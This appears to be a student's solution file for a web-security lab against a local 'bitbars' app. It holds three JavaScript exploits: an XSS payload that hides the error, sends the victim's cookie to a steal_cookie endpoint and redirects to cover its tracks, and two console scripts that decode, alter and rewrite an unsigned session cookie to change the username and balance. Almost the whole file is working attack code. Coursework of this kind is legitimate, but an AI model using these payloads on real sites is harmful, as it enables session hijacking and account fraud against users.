// Exploit A
doesnotexist
<script>
// Remove the error message ASAP.
const error_msg = document.getElementsByClassName('error')[0];
error_msg.parentNode.removeChild(error_msg);

// Now send all the information we want to our malicious server.
const params = "cookie=" + document.cookie;
const req = new XMLHttpRequest();
req.withCredentials=true;
req.onload = function() {
	// Once sent, reload the page so even the URL looks okay.
	window.location = 'http://localhost:3000/profile';
}
req.open('GET', 'http://localhost:3000/steal_cookie?' + params);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send(null);
</script>


// Exploit C
// Do everything in an immediately invoked function expression so no evidence
// of our mischief is left behind.
(function() {
	function getCookie(key) {
  const value = "; " + document.cookie;
  const parts = value.split("; " + key + "=");
	  if (parts.length == 2) return parts.pop().split(";").shift();
	};
	let session_str = getCookie('session')
	let session= JSON.parse(atob(session_str));
	session.account.username = "user1";
	session.account.bitbars = 200;
	// Overwrite the "session" cookie.
	document.cookie = "session=" + btoa(JSON.stringify(session));
})();
clear();

// Exploit D
(function() {
	function getCookie(key) {
  const value = "; " + document.cookie;
  const parts = value.split("; " + key + "=");
	  if (parts.length == 2) return parts.pop().split(";").shift();
	};
	let session_str = getCookie('session')
	let session= JSON.parse(atob(session_str));
	session.account.bitbars = 1e+6 + 1;
	// Overwrite the "session" cookie.
	document.cookie = "session=" + btoa(JSON.stringify(session));
})();
clear();